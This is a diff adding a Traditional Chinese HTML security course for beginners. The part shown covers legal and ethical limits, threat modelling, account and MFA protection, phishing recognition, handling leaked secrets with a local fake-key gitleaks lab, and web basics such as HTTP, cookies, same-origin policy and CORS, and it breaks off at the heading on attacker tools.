@@ -1,0 +1,881 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>資安攻防入門講義：從零到能保護自己的專案</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@600;800&family=Noto+Sans+TC:wght@400;500;700&family=JetBrains+Mono:wght@400;600&display=swap">
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<div class="doc-shell" id="top">
+  <header class="doc-head">
+    <div class="eyebrow"><a href="../">← 所有講義</a> · 資安 · 2026-11-05</div>
+    <h1>資安攻防入門講義：從零到能保護自己的專案</h1>
+    <p class="lead">這份講義的目標只有一個：讓你看懂常見攻擊，並親手把自己的專案補起來。讀完後，你不會變成職業滲透測試員，但足以擋下個人專案最常遇到的攻擊。</p>
+  </header>
+
+  <details class="toc" id="toc">
+    <summary>目錄</summary>
+    <ol>
+      <li><a href="#如何使用這份講義">如何使用這份講義</a></li>
+      <li><a href="#第-1-課-核心觀念與攻擊者思維">第 1 課 核心觀念與攻擊者思維</a></li>
+      <li><a href="#第-2-課-帳號與密鑰">第 2 課 帳號與密鑰</a></li>
+      <li><a href="#第-3-課-網頁運作與攻擊基礎">第 3 課 網頁運作與攻擊基礎</a></li>
+      <li><a href="#第-4-課-網頁漏洞攻防">第 4 課 網頁漏洞攻防</a></li>
+      <li><a href="#第-5-課-供應鏈與-ai-風險">第 5 課 供應鏈與 AI 風險</a></li>
+      <li><a href="#第-6-課-偵測與事件應變">第 6 課 偵測與事件應變</a></li>
+      <li><a href="#第-7-課-實戰替-你的專案-做防護">第 7 課 實戰：替你的專案做防護</a></li>
+      <li><a href="#12-週練習計畫與合法練習資源">12 週練習計畫與合法練習資源</a></li>
+      <li><a href="#上線前檢查清單">上線前檢查清單</a></li>
+      <li><a href="#名詞對照表">名詞對照表</a></li>
+      <li><a href="#自我測驗解答">自我測驗解答</a></li>
+      <li><a href="#驗證範圍與參考資料">驗證範圍與參考資料</a></li>
+    </ol>
+    <div class="toc-progress">
+      <span id="task-count">實作清單：已完成 0 / 68</span>
+      <progress id="task-bar" max="68" value="0"></progress>
+    </div>
+  </details>
+
+  <main class="doc">
+<h2 id="如何使用這份講義">如何使用這份講義</h2>
+<h3 id="學完你能做到什麼">學完你能做到什麼</h3>
+<ul><li><p>用攻擊者的角度，列出專案最值得保護的東西和可能的入侵路徑。</p>
+</li><li><p>保護好 Google、GitHub 和交易平台帳號，並在密鑰外洩時正確處理。</p>
+</li><li><p>說明權限控管失效、注入、XSS、CSRF 的原理，並在練習環境重現與修補。</p>
+</li><li><p>替你的專案完成一輪威脅建模、修補和驗證。</p>
+</li><li><p>被入侵時知道先做什麼、後做什麼。</p>
+</li></ul>
+<h3 id="每課都走同一個循環">每課都走同一個循環</h3>
+<ol><li><p><strong>理解：</strong> 先搞懂這個攻擊為什麼會成功。</p>
+</li><li><p><strong>攻擊：</strong> 在練習環境親手重現一次。</p>
+</li><li><p><strong>修補：</strong> 從根本原因修，不只擋住那一組輸入。</p>
+</li><li><p><strong>驗證：</strong> 用同樣手法再攻擊一次，確認真的擋住。</p>
+</li></ol>
+<p>只讀不做很難學會資安。每課的實作比閱讀重要，時間不夠時，寧可少讀一段，也不要跳過實作。</p>
+<h3 id="法律與道德紅線">法律與道德紅線</h3>
+<p><strong>只能攻擊三種目標：你自己的系統、專門提供的練習環境，以及取得明確書面授權的目標。</strong> 其他目標一律不碰。</p>
+<ul><li><p>「只是看看，沒有破壞」不是免責理由。在台灣，未經授權入侵電腦可能觸犯刑法妨害電腦使用罪（第 358 至 363 條）。</p>
+</li><li><p>你自己的帳號跑在別人的平台上，不代表整個平台都能測。Google、GitHub、交易平台的伺服器都不是你的測試目標。</p>
+</li><li><p>想測第三方服務時，先讀對方的漏洞通報政策（VDP）或漏洞獎金計畫（Bug Bounty）規則，並嚴守範圍。</p>
+</li><li><p>意外發現別人的漏洞時，不要繼續深入、不要下載資料，應透過官方管道通報。</p>
+</li></ul>
+<h3 id="學習順序與時間">學習順序與時間</h3>
+<div class="table-wrap"><table><thead><tr><th>課程</th><th>主題</th><th>建議時間</th><th>重要程度</th></tr></thead><tbody><tr><td>第 1 課</td><td>核心觀念與攻擊者思維</td><td>3 小時</td><td>必學</td></tr><tr><td>第 2 課</td><td>帳號與密鑰</td><td>4 小時</td><td>必學，應最先採取行動</td></tr><tr><td>第 3 課</td><td>網頁運作與攻擊基礎</td><td>5 小時</td><td>必學</td></tr><tr><td>第 4 課</td><td>網頁漏洞攻防</td><td>15 小時以上</td><td>必學</td></tr><tr><td>第 5 課</td><td>供應鏈與 AI 風險</td><td>3 小時</td><td>寫專案前學</td></tr><tr><td>第 6 課</td><td>偵測與事件應變</td><td>3 小時</td><td>上線前學</td></tr><tr><td>第 7 課</td><td>實戰：替你的專案做防護</td><td>開發期間持續進行</td><td>最終目標</td></tr></tbody></table></div>
+<p>時間是粗估值，依你的程式基礎會有落差。如果只有今天有空，請直接做第 2 課的帳號檢查，那是投入最少、效果最大的一步。</p>
+<h2 id="第-1-課-核心觀念與攻擊者思維">第 1 課 核心觀念與攻擊者思維</h2>
+<p>攻擊者不會從「怎麼破解」開始想，而是從「什麼值錢、哪裡最好進」開始。防守方也應該用同樣順序思考。</p>
+<h3 id="11-資安在保護什麼cia-三要素">1.1 資安在保護什麼：CIA 三要素</h3>
+<p>幾乎所有資安事件，都是破壞了以下三者之一。</p>
+<div class="table-wrap"><table><thead><tr><th>要素</th><th>意思</th><th>被破壞的例子（以交易日誌為例）</th></tr></thead><tbody><tr><td>機密性（Confidentiality）</td><td>只有該看的人看得到</td><td>交易紀錄和帳號資訊被外人讀到</td></tr><tr><td>完整性（Integrity）</td><td>資料沒有被竄改</td><td>別人改掉損益數字，你的檢討全部失準</td></tr><tr><td>可用性（Availability）</td><td>需要時用得到</td><td>工作表被清空，且沒有備份</td></tr></tbody></table></div>
+<p>另外要分清兩個常被混用的詞：</p>
+<ul><li><p><strong>驗證（Authentication）：</strong> 你是誰？例如登入。</p>
+</li><li><p><strong>授權（Authorization）：</strong> 你可以做什麼？例如能不能讀這筆資料。</p>
+</li></ul>
+<p>很多嚴重漏洞都是「有驗證、沒授權」，也就是確認了你已登入，卻沒檢查這筆資料是不是你的。</p>
+<h3 id="12-五個基本名詞">1.2 五個基本名詞</h3>
+<div class="table-wrap"><table><thead><tr><th>名詞</th><th>意思</th><th>生活比喻</th></tr></thead><tbody><tr><td>資產（Asset）</td><td>值得保護的東西</td><td>家裡的現金</td></tr><tr><td>威脅（Threat）</td><td>可能造成傷害的人或事件</td><td>小偷</td></tr><tr><td>漏洞（Vulnerability）</td><td>可以被利用的弱點</td><td>沒鎖的窗戶</td></tr><tr><td>攻擊手法（Exploit）</td><td>利用弱點的實際做法</td><td>從窗戶爬進去</td></tr><tr><td>風險（Risk）</td><td>發生機率 × 造成損失</td><td>住一樓又沒裝鐵窗有多危險</td></tr></tbody></table></div>
+<p>資源永遠有限，所以目標不是消滅所有漏洞，而是先處理風險最高的部分。</p>
+<h3 id="13-誰會攻擊你">1.3 誰會攻擊你</h3>
+<p>個人專案很少被專門鎖定，但自動化攻擊不挑對象。</p>
+<div class="table-wrap"><table><thead><tr><th>攻擊者</th><th>目的</th><th>常用方式</th><th>對你的相關性</th></tr></thead><tbody><tr><td>自動化掃描與機器人</td><td>大量找容易下手的目標</td><td>掃公開 repo 的密鑰、試已外洩的密碼</td><td>高</td></tr><tr><td>大規模詐騙集團</td><td>盜帳號、騙錢</td><td>釣魚信、假登入頁、竊密木馬</td><td>高，尤其你有交易帳號</td></tr><tr><td>惡意套件作者</td><td>感染開發者電腦</td><td>偽裝成常用套件</td><td>中高，你會寫程式</td></tr><tr><td>認識你的人</td><td>好奇或惡意</td><td>用你借出的電腦或分享過的連結</td><td>中</td></tr><tr><td>國家級駭客</td><td>政治、情報</td><td>客製化攻擊</td><td>低，不必納入個人專案防護目標</td></tr></tbody></table></div>
+<h3 id="14-攻擊面所有可能進來的門">1.4 攻擊面：所有可能進來的門</h3>
+<p>攻擊面是攻擊者能接觸到的所有入口。很多人只想到程式，其實入口通常比程式多。</p>
+<ul><li><p><strong>人：</strong> 你會點連結、會輸入密碼、也會趕時間。</p>
+</li><li><p><strong>帳號：</strong> Google、GitHub、交易平台、Email。</p>
+</li><li><p><strong>裝置：</strong> 你的電腦、手機、瀏覽器擴充功能。</p>
+</li><li><p><strong>程式：</strong> 網址、表單、上傳功能、API。</p>
+</li><li><p><strong>相依項目：</strong> 套件、CI、第三方服務、AI 工具。</p>
+</li><li><p><strong>資料：</strong> 備份、匯出的 CSV、截圖、公開分享連結。</p>
+</li></ul>
+<p>減少攻擊面通常比加強防守便宜。用不到的功能、權限、帳號和分享連結，直接關掉就少一道門。</p>
+<h3 id="15-一次攻擊通常怎麼發生">1.5 一次攻擊通常怎麼發生</h3>
+<p>實際入侵常是一串小步驟，所以在任何一步擋下都有價值。</p>
+<ol><li><p><strong>偵察：</strong> 找公開資訊，例如 GitHub、社群貼文、外洩密碼庫。</p>
+</li><li><p><strong>取得入口：</strong> 釣魚、撞庫、外洩金鑰或網站漏洞。</p>
+</li><li><p><strong>站穩腳步：</strong> 留下能再次進入的方式，例如新增 OAuth 授權、轉寄規則。</p>
+</li><li><p><strong>擴大權限：</strong> 從 Email 重設其他服務的密碼，或用找到的金鑰碰更多系統。</p>
+</li><li><p><strong>達成目的：</strong> 偷資料、勒索、盜用帳號或轉走資產。</p>
+</li><li><p><strong>掩蓋痕跡：</strong> 刪除通知信、清除紀錄。</p>
+</li></ol>
+<p>第 3 步特別容易被忽略：只改密碼，可能無法清除攻擊者留下的授權和轉寄規則。第 6 課會教你如何檢查。</p>
+<h3 id="16-防守的六個原則">1.6 防守的六個原則</h3>
+<ol><li><p><strong>最小權限：</strong> 只給完成工作所需的最小權限。</p>
+</li><li><p><strong>縱深防禦：</strong> 不依賴單一防線，一層失守還有下一層。</p>
+</li><li><p><strong>預設拒絕：</strong> 沒有明確允許的就拒絕，出錯時也要往安全的一邊失敗。</p>
+</li><li><p><strong>不信任輸入：</strong> 瀏覽器送來的一切都可能被改過，包含隱藏欄位和 Cookie。</p>
+</li><li><p><strong>保持簡單：</strong> 系統越複雜越難檢查，也越容易出錯。</p>
+</li><li><p><strong>假設會被攻破：</strong> 先備好備份、紀錄和應變流程。</p>
+</li></ol>
+<p>另外要避免<strong>隱匿式安全</strong>：把網址取得很長、不告訴別人，不等於有權限控管。網址可能出現在瀏覽紀錄、截圖或分享訊息裡。</p>
+<h3 id="17-威脅建模四個問題">1.7 威脅建模：四個問題</h3>
+<p>威脅建模就是在動手前有系統地想一遍。個人專案只要回答四個問題：</p>
+<ol><li><p>我在做什麼？畫出資料從哪裡來、到哪裡去。</p>
+</li><li><p>哪裡可能出錯？</p>
+</li><li><p>我要怎麼處理？</p>
+</li><li><p>我做得夠好嗎？實際測試一次。</p>
+</li></ol>
+<p>回答第 2 題時，可以用 STRIDE 當提示：</p>
+<div class="table-wrap"><table><thead><tr><th>類型</th><th>問自己</th><th>主要破壞</th></tr></thead><tbody><tr><td>Spoofing 冒充</td><td>別人能假裝成我嗎？</td><td>驗證</td></tr><tr><td>Tampering 竄改</td><td>資料能在我不知情時被改嗎？</td><td>完整性</td></tr><tr><td>Repudiation 否認</td><td>出事後查得出是誰做的嗎？</td><td>可追溯性</td></tr><tr><td>Information Disclosure 洩漏</td><td>資料會被不該看的人看到嗎？</td><td>機密性</td></tr><tr><td>Denial of Service 阻斷</td><td>服務或額度會被耗盡嗎？</td><td>可用性</td></tr><tr><td>Elevation of Privilege 提權</td><td>低權限者能做高權限的事嗎？</td><td>授權</td></tr></tbody></table></div>
+<h3 id="18-風險怎麼排序">1.8 風險怎麼排序</h3>
+<p>用 1 到 3 分評估機率和損失，兩者相乘。分數最高的先做；同分時，先做最省力的。</p>
+<div class="table-wrap"><table><thead><tr><th>分數</th><th>處理方式</th></tr></thead><tbody><tr><td>6 到 9</td><td>現在處理</td></tr><tr><td>3 到 4</td><td>排進近期計畫</td></tr><tr><td>1 到 2</td><td>記錄下來，定期再看</td></tr></tbody></table></div>
+<h3 id="實作完成你的資產盤點">實作：完成你的資產盤點</h3>
+<p>以下的機率和損失是我預先填的起始判斷，請依你的實際情況修改。</p>
+<div class="table-wrap"><table><thead><tr><th>資產</th><th>最怕發生什麼</th><th>機率</th><th>損失</th><th>風險</th><th>第一步防護</th></tr></thead><tbody><tr><td>Google 帳號</td><td>被盜後資料全失，並可重設其他服務</td><td>2</td><td>3</td><td>6</td><td>開啟防釣魚的多因素驗證</td></tr><tr><td>交易平台帳號</td><td>被盜用、資金或帳戶受損</td><td>2</td><td>3</td><td>6</td><td>專用密碼與多因素驗證（若平台提供）</td></tr><tr><td>GitHub 帳號</td><td>程式被竄改、私有 repo 外洩</td><td>2</td><td>2</td><td>4</td><td>開啟多因素驗證</td></tr><tr><td>交易日誌工作表</td><td>被外人讀取或竄改</td><td>2</td><td>2</td><td>4</td><td>檢查分享設定</td></tr><tr><td>本機 CSV 與截圖</td><td>誤傳到公開 repo</td><td>2</td><td>2</td><td>4</td><td>寫好 .gitignore</td></tr><tr><td>你的專案網址</td><td>被外人呼叫並寫入資料</td><td>2</td><td>2</td><td>4</td><td>存取權限設為只有自己</td></tr><tr><td>開發用電腦</td><td>中毒後所有登入狀態被偷</td><td>1</td><td>3</td><td>3</td><td>系統更新、不裝來路不明的軟體</td></tr></tbody></table></div>
+<p><strong>完成標準：</strong> 修改完表格，並寫下你要最先處理的 3 項。</p>
+<h3 id="自我測驗">自我測驗</h3>
+<ol><li><p>登入後把網址的 <code>id=5</code> 改成 <code>id=6</code>，就看到別人的資料。這主要是驗證還是授權的問題？</p>
+</li><li><p>帳號被盜後只改密碼，為什麼可能不夠？</p>
+</li><li><p>為什麼「網址很長，沒人猜得到」不算權限控管？</p>
+</li></ol>
+<h2 id="第-2-課-帳號與密鑰">第 2 課 帳號與密鑰</h2>
+<p>攻擊者能用偷來的憑證登入時，就不需要破解程式。所以這一課是全部課程中最划算的投資。</p>
+<h3 id="21-帳號是怎麼被盜的">2.1 帳號是怎麼被盜的</h3>
+<div class="table-wrap"><table><thead><tr><th>手法</th><th>怎麼運作</th><th>主要防禦</th></tr></thead><tbody><tr><td>釣魚（Phishing）</td><td>用假信或假登入頁騙你輸入密碼與驗證碼</td><td>通行金鑰、硬體金鑰、不從信件連結登入</td></tr><tr><td>撞庫（Credential Stuffing）</td><td>拿別站外洩的帳密，大量嘗試其他網站</td><td>每個網站用不同密碼</td></tr><tr><td>密碼噴灑（Password Spraying）</td><td>用少數常見密碼嘗試大量帳號</td><td>長且隨機的密碼</td></tr><tr><td>竊密木馬（Infostealer）</td><td>惡意程式偷走瀏覽器密碼和登入 Cookie</td><td>不裝來路不明的軟體、保持系統更新</td></tr><tr><td>工作階段竊取（Session Hijacking）</td><td>偷到登入 Cookie 後，不用密碼也能登入</td><td>保護裝置、登出不用的工作階段</td></tr><tr><td>OAuth 授權釣魚</td><td>騙你按「允許」，把帳號權限交給惡意應用程式</td><td>看清權限內容、定期移除舊授權</td></tr><tr><td>多因素疲勞轟炸（MFA Fatigue）</td><td>不斷發送登入確認，等你誤按允許</td><td>不是你發起的請求一律拒絕，並立刻改密碼</td></tr><tr><td>SIM 卡挾持（SIM Swap）</td><td>騙電信商換卡，以接收你的簡訊驗證碼</td><td>重要帳號不用簡訊當驗證方式</td></tr></tbody></table></div>
+<h3 id="22-釣魚怎麼辨認">2.2 釣魚怎麼辨認</h3>
+<p>釣魚的核心不是技術，而是製造急迫感，讓你來不及思考。常見話術包括帳戶即將停用、偵測到異常登入、出金失敗和獎勵即將過期。</p>
+<ul><li><p><strong>先看網域：</strong> 由右往左讀主網域。<code>your-broker.com.login-check.example</code> 的真正網域是 <code>login-check.example</code>，不是你的交易平台。</p>
+</li><li><p><strong>不要靠外觀判斷：</strong> 假網站可以完全複製畫面，也可以有 HTTPS 鎖頭。鎖頭只代表連線加密，不代表對方可信。</p>
+</li><li><p><strong>不要從信件連結登入：</strong> 用自己的書籤或手動輸入網址前往。</p>
+</li><li><p><strong>注意下載：</strong> 交易者常被假的指標、外掛或報表工具引誘，這些都可能是竊密木馬。</p>
+</li><li><p><strong>懷疑就停下：</strong> 真正的急事，到官方網站登入後也看得到。</p>
+</li></ul>
+<p>進階釣魚會在你和真網站之間即時轉送資料，連一次性驗證碼都能騙走。通行金鑰和硬體金鑰會綁定真實網域，在假網站上無法使用，因此能防住這種攻擊。</p>
+<h3 id="23-多因素驗證的強度排序">2.3 多因素驗證的強度排序</h3>
+<div class="table-wrap"><table><thead><tr><th>排名</th><th>方式</th><th>防釣魚能力</th><th>建議</th></tr></thead><tbody><tr><td>1</td><td>硬體安全金鑰（FIDO2）</td><td>強</td><td>最重要的帳號可考慮，並準備兩把</td></tr><tr><td>2</td><td>通行金鑰（Passkey）</td><td>強</td><td>平台支援就優先使用</td></tr><tr><td>3</td><td>驗證器 App（TOTP）</td><td>中，驗證碼仍可能被騙走</td><td>不支援通行金鑰時使用</td></tr><tr><td>4</td><td>手機推播確認</td><td>中，可能被疲勞轟炸</td><td>只確認自己發起的登入</td></tr><tr><td>5</td><td>簡訊驗證碼</td><td>弱</td><td>總比沒有好，但應盡量換掉</td></tr></tbody></table></div>
+<p>備援碼也要離線保存。沒有備援方式的多因素驗證，可能讓你把自己鎖在帳號外面。</p>
+<h3 id="24-密碼規則">2.4 密碼規則</h3>
+<ul><li><p><strong>用密碼管理器：</strong> 這是做到「每站不同密碼」最實際的方法。它也只會在正確網域自動填入，能幫你多擋一次釣魚。</p>
+</li><li><p><strong>長度比複雜度重要：</strong> 重要帳號使用管理器產生的長隨機密碼。</p>
+</li><li><p><strong>主密碼要特別處理：</strong> 使用一組只有你知道的長密語，不要用在其他地方，並開啟管理器的多因素驗證。</p>
+</li><li><p><strong>不要定期亂改：</strong> 除非有外洩跡象，否則不必為了改而改，但一定不可重複使用。</p>
+</li><li><p><strong>檢查是否外洩：</strong> 可到 <a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">Have I Been Pwned</a> 查 Email 是否出現在外洩事件中。</p>
+</li></ul>
+<h3 id="25-先保護-email">2.5 先保護 Email</h3>
+<p>Email 通常是所有帳號的總鑰匙，因為多數服務都能透過 Email 重設密碼。對你來說，Google 帳號應排在第一位。</p>
+<div class="table-wrap"><table><thead><tr><th>服務</th><th>要檢查的項目</th></tr></thead><tbody><tr><td>Google</td><td><a href="https://myaccount.google.com/security-checkup" target="_blank" rel="noopener">安全性檢查</a>、兩步驟驗證、復原電子郵件與電話、<a href="https://myaccount.google.com/connections" target="_blank" rel="noopener">第三方連結</a>、Gmail 的轉寄和篩選器</td></tr><tr><td>GitHub</td><td>多因素驗證或通行金鑰、SSH 金鑰、Personal Access Token、已授權的 OAuth 應用程式</td></tr><tr><td>交易與券商平台</td><td>專用密碼、平台提供的多因素驗證、登入通知、出金資訊</td></tr><tr><td>密碼管理器</td><td>主密碼、多因素驗證、復原方式</td></tr></tbody></table></div>
+<h3 id="26-密鑰是什麼為什麼危險">2.6 密鑰是什麼，為什麼危險</h3>
+<p>API 金鑰、Token 和服務帳號憑證，都等於一組不需要互動的帳號密碼。它們常常沒有多因素驗證保護，一旦外洩就能直接使用。</p>
+<div class="table-wrap"><table><thead><tr><th>類型</th><th>常見例子</th><th>外洩後果</th></tr></thead><tbody><tr><td>API 金鑰</td><td>AI 服務金鑰、資料服務金鑰</td><td>被盜用、產生費用</td></tr><tr><td>存取權杖</td><td>GitHub Token、OAuth Token</td><td>以你的身分操作服務</td></tr><tr><td>登入憑證檔</td><td><code>.clasprc.json</code>、服務帳號 JSON</td><td>程式化存取你的雲端資源</td></tr><tr><td>私鑰</td><td>SSH 私鑰</td><td>存取伺服器或 repo</td></tr><tr><td>連線字串</td><td>資料庫 URL</td><td>資料庫被讀取或清空</td></tr></tbody></table></div>
+<p>公開 repo 中的密鑰可能很快被自動掃描器發現，所以不能假設「只公開了幾分鐘」就沒事。</p>
+<h3 id="27-密鑰的正確管理">2.7 密鑰的正確管理</h3>
+<ol><li><p><strong>不寫進程式碼：</strong> 使用環境變數或平台提供的密鑰儲存。GAS 可用 Script Properties，但專案編輯者仍可能接觸得到。</p>
+</li><li><p><strong>先寫 .gitignore：</strong> 建立 repo 時就先排除敏感檔案。</p>
+</li><li><p><strong>權限最小化：</strong> 只給必要的 repo、讀寫範圍和有效期限。</p>
+</li><li><p><strong>開啟防護：</strong> 使用 GitHub 的 Secret Scanning 和 Push Protection，並在提交前掃描。</p>
+</li><li><p><strong>定期檢查：</strong> 移除不再使用的金鑰與 Token。</p>
+</li></ol>
+<p><code>.gitignore</code> 範例：</p>
+<pre><code class="language-text">.env
+.env.*
+!.env.example
+.clasprc.json
+*.pem
+*.key
+# 專案不需要提交的私人交易資料
+*.csv
+screenshots/</code></pre>
+<p>注意：<code>.gitignore</code> 只對尚未追蹤的檔案有效。已提交過的檔案要另外處理。</p>
+<h3 id="28-密鑰外洩時的正確順序">2.8 密鑰外洩時的正確順序</h3>
+<ol><li><p><strong>先撤銷或更換：</strong> 這是第一步。只刪除程式碼，金鑰依然有效。</p>
+</li><li><p><strong>查使用紀錄：</strong> 看外洩期間有沒有異常呼叫、費用或操作。</p>
+</li><li><p><strong>再清除歷史：</strong> 必要時才重寫 Git 歷史。但已外洩的內容可能被複製，所以這一步不能取代撤銷。</p>
+</li><li><p><strong>找出原因：</strong> 補上 .gitignore、掃描工具或流程缺口。</p>
+</li></ol>
+<h3 id="實作-1完成帳號體檢">實作 1：完成帳號體檢</h3>
+<p>這部分請你親自操作，密碼和驗證碼不要交給任何人，包括 AI。</p>
+<ul><li class="task"><label><input type="checkbox" data-task="0"><span>完成 Google 安全性檢查</span></label></li><li class="task"><label><input type="checkbox" data-task="1"><span>移除不認得或不再使用的第三方應用程式</span></label></li><li class="task"><label><input type="checkbox" data-task="2"><span>檢查 Gmail 的轉寄地址和篩選器</span></label></li><li class="task"><label><input type="checkbox" data-task="3"><span>檢查 Google、GitHub、交易平台的多因素驗證設定</span></label></li><li class="task"><label><input type="checkbox" data-task="4"><span>改掉所有重複使用的重要密碼</span></label></li><li class="task"><label><input type="checkbox" data-task="5"><span>離線保存備援碼</span></label></li><li class="task"><label><input type="checkbox" data-task="6"><span>檢查瀏覽器擴充功能，移除不用的項目</span></label></li></ul>
+<h3 id="實作-2親手證明刪掉不等於消失">實作 2：親手證明「刪掉不等於消失」</h3>
+<p>這個練習只在本機進行，使用假金鑰。請用 <code>ghp_</code> 開頭加 36 個隨手輸入的英數字當假金鑰，先把下面指令中的佔位文字換掉。</p>
+<pre><code class="language-bash">mkdir secret-lab
+cd secret-lab
+git init
+echo &quot;API_KEY=ghp_換成你輸入的假字串&quot; &gt; config.txt
+git add config.txt
+git commit -m &quot;add config&quot;
+git rm config.txt
+git commit -m &quot;remove config&quot;
+git log -p</code></pre>
+<p>你會看到檔案雖然刪了，內容仍在歷史中。接著<a href="https://github.com/gitleaks/gitleaks" target="_blank" rel="noopener">安裝 gitleaks</a> 並掃描：</p>
+<pre><code class="language-bash">gitleaks git -v .</code></pre>
+<p>如果它抓到了，你就有一個提交前的防線；如果沒抓到，也是重要的一課：掃描工具能降低風險，但不保證抓到全部。</p>
+<p><strong>完成標準：</strong> 你能向別人解釋，為什麼密鑰外洩時要先撤銷，而不是先刪檔案。</p>
+<h3 id="自我測驗-1">自我測驗</h3>
+<ol><li><p>為什麼通行金鑰比驗證器 App 的六位數驗證碼更能防釣魚？</p>
+</li><li><p>你在公開 repo 發現自己的 Token，應該先做哪一件事？</p>
+</li><li><p>網站有 HTTPS 鎖頭，是否代表它不是釣魚網站？</p>
+</li></ol>
+<h2 id="第-3-課-網頁運作與攻擊基礎">第 3 課 網頁運作與攻擊基礎</h2>
+<p>大多數網頁漏洞都來自同一個錯誤：伺服器相信了使用者可以控制的東西。這一課要讓你親眼看到，瀏覽器送出的內容全部都能修改。</p>
+<h3 id="31-一次網頁請求長什麼樣子">3.1 一次網頁請求長什麼樣子</h3>
+<p>瀏覽器和伺服器透過 HTTP 溝通。你點一個按鈕，實際上是送出類似這樣的文字：</p>
+<pre><code class="language-http">POST /api/trades/update HTTP/1.1
+Host: app.example
+Cookie: session=abc123
+Content-Type: application/json
+
+{&quot;tradeId&quot;: 5, &quot;note&quot;: &quot;等收K&quot;}</code></pre>
+<p>伺服器則回傳類似這樣的回應：</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
+Content-Type: application/json
+
+{&quot;ok&quot;: true}</code></pre>
+<div class="table-wrap"><table><thead><tr><th>部分</th><th>用途</th><th>攻擊者能否修改</th></tr></thead><tbody><tr><td>方法與路徑</td><td>要做什麼、對哪個資源</td><td>可以</td></tr><tr><td>查詢參數，例如 <code>?id=5</code></td><td>傳遞參數</td><td>可以</td></tr><tr><td>標頭，例如 Referer、User-Agent</td><td>附加資訊</td><td>可以</td></tr><tr><td>Cookie</td><td>通常用來保存登入狀態</td><td>自己的可以</td></tr><tr><td>內容（Body）</td><td>表單或 JSON 資料</td><td>可以</td></tr></tbody></table></div>
+<p><strong>關鍵觀念：</strong> 網頁上的按鈕、下拉選單、隱藏欄位和 JavaScript 檢查，都只是給正常使用者的介面。攻擊者可以略過介面，直接送出任何請求。</p>
+<h3 id="32-信任邊界這課最重要的概念">3.2 信任邊界：這課最重要的概念</h3>
+<p>信任邊界是資料從「你控制不了」進入「你控制得了」的那條線。每次跨越，都要檢查。</p>
+<ul><li><p><strong>前端驗證：</strong> 只為了使用體驗，不算安全防線。</p>
+</li><li><p><strong>後端驗證：</strong> 才是真正的防線，因為攻擊者碰不到伺服器上的程式碼。</p>
+</li><li><p><strong>看似內部的資料也可能不可信：</strong> 上傳的 CSV、資料庫中他人輸入過的文字、第三方 API 回應，都應視為輸入。</p>
+</li></ul>
+<p>驗證時要盡量使用<strong>允許清單</strong>：明確定義什麼是合法的，其他全部拒絕。封鎖清單很容易漏掉變形寫法。</p>
+<div class="table-wrap"><table><thead><tr><th>欄位</th><th>不好的做法</th><th>較好的做法</th></tr></thead><tbody><tr><td>方向</td><td>擋掉 <code>&lt;script&gt;</code></td><td>只接受 <code>Long</code> 或 <code>Short</code></td></tr><tr><td>口數</td><td>只檢查有值</td><td>必須是 1 到合理上限之間的整數</td></tr><tr><td>日期</td><td>直接存字串</td><td>解析成日期並檢查範圍</td></tr><tr><td>筆記</td><td>刪除危險字元</td><td>限制長度，並在輸出時依情境編碼</td></tr></tbody></table></div>
+<h3 id="33-登入狀態與-cookie">3.3 登入狀態與 Cookie</h3>
+<p>HTTP 本身不記得你是誰。登入後，伺服器通常會發一個工作階段識別碼，瀏覽器之後每次請求都會自動帶上它。誰拿到這個識別碼，通常就能冒充你。</p>
+<div class="table-wrap"><table><thead><tr><th>Cookie 屬性</th><th>作用</th><th>主要防的是什麼</th></tr></thead><tbody><tr><td><code>HttpOnly</code></td><td>JavaScript 讀不到</td><td>降低 XSS 偷走 Cookie 的風險</td></tr><tr><td><code>Secure</code></td><td>只透過 HTTPS 傳送</td><td>防止明文傳輸被竊聽</td></tr><tr><td><code>SameSite</code></td><td>限制跨網站請求是否帶上 Cookie</td><td>降低 CSRF 風險</td></tr><tr><td>過期時間</td><td>控制有效期限</td><td>縮短被盜後可使用的時間</td></tr></tbody></table></div>
+<h3 id="34-同源政策與-cors">3.4 同源政策與 CORS</h3>
+<p>同源指通訊協定、網域、連接埠三者都相同。</p>
+<div class="table-wrap"><table><thead><tr><th>網址</th><th>與 <code>https://app.example</code> 同源嗎</th><th>原因</th></tr></thead><tbody><tr><td><code>https://app.example/report</code></td><td>是</td><td>只有路徑不同</td></tr><tr><td><code>http://app.example</code></td><td>否</td><td>通訊協定不同</td></tr><tr><td><code>https://api.app.example</code></td><td>否</td><td>網域不同</td></tr><tr><td><code>https://app.example:8443</code></td><td>否</td><td>連接埠不同</td></tr></tbody></table></div>
+<p>同源政策限制的是<strong>一個網站的 JavaScript 讀取另一個網站的回應</strong>。它有兩個常見誤解：</p>
+<ul><li><p><strong>它不阻止所有跨站請求。</strong> 惡意網站通常仍能讓瀏覽器送出請求，這就是 CSRF 存在的原因。</p>
+</li><li><p><strong>CORS 不是防護機制。</strong> CORS 是放寬同源限制的方法。設定成允許任何來源，等於主動開門。</p>
+</li></ul>
+<p>CORS 也不能取代伺服器端的權限檢查，因為 curl 這類非瀏覽器工具根本不受它限制。</p>
+<h3 id="35-https-保護什麼不保護什麼">3.5 HTTPS 保護什麼，不保護什麼</h3>
+<div class="table-wrap"><table><thead><tr><th>HTTPS 能做到</th><th>HTTPS 做不到</th></tr></thead><tbody><tr><td>防止傳輸途中被竊聽或竄改</td><td>保證網站本身可信</td></tr><tr><td>確認憑證屬於該網域</td><td>擋下 SQL 注入、XSS 等程式漏洞</td></tr><tr><td>保護 Cookie 和表單內容的傳輸</td><td>防止伺服器資料外洩</td></tr></tbody></table></div>
+<h3 id="36-攻擊者常用工具">3.6 攻擊者常用工具</h3>
